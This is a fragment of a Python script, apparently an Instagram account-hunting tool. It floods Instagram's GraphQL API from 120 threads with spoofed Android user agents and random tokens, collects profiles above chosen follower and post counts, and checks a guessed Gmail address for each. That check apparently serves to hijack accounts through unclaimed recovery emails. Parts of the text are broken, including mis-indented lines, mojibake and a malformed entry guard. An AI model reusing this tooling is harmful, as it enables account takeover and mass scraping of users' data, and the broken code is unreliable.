                brand = random.choice(['SAMSUNG', 'HUAWEI', 'LGE/lge', 'HTC', 'ASUS', 'ZTE', 'ONEPLUS', 'XIAOMI', 'OPPO', 'VIVO', 'SONY', 'REALME'])
                build_suffix = str(random.randint(111, 999))
                user_agent = f"Instagram 311.0.0.32.118 Android ({android_version}; {dpi}dpi; {resolution}; {brand}; SM-T{model_number}; SM-T{model_number}; qcom; en_US; 545986{build_suffix})"
                lsd_token = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en,en-US;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'dnt': '1',
                    'origin': 'https://www.instagram.com',
                    'priority': 'u=1, i',
                    'referer': 'https://www.instagram.com/cristiano/following/',
                    'user-agent': user_agent,
                    'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                    'x-fb-lsd': lsd_token
                }
                data = {
                    'lsd': lsd_token,
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                    'variables': json.dumps({'userID': user_id, 'username': 'cristiano'}),
                    'server_timestamps': 'true',
                    'doc_id': '7717269488336001'
                }
                response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
                user_info = response.json().get('data', {}).get('user', {})
                username = user_info.get('username', '')
                infoinsta[username] = user_info
                follower_count = int(user_info.get('follower_count', 0))
                media_count = int(user_info.get('media_count', 0))
                
                if username and '_' not in username and follower_count >= min_followers and media_count >= min_posts:
                    email = f"{username}@gmail.com"
                    check(email)
            except Exception as e:
pass
    
    print(f'\n{Colors.CYAN}‚îå‚îÄ({Colors.GOLD}FILTER SETTINGS{Colors.CYAN}){Colors.RESET}')
    minimum_followers = safe_int_input(f'{Colors.CYAN}‚îî‚îÄ‚îÄ‚û§ {Colors.YELLOW}Enter minimum followers needed: {Colors.RESET}', 0)
    minimum_posts = safe_int_input(f'{Colors.CYAN}‚îî‚îÄ‚îÄ‚û§ {Colors.YELLOW}Enter minimum number of posts needed: {Colors.RESET}', 0)
    
    print(f'\n{Colors.GREEN}üöÄ Starting scanner with {Colors.YELLOW}120{Colors.GREEN} threads...{Colors.RESET}')
    Animations.scanning_animation("Launching Scanner", 3)
    
    for _ in range(120):
        Thread(target=gg, args=(minimum_followers, minimum_posts, generate_user_id)).start()

if name == "main":
    main()
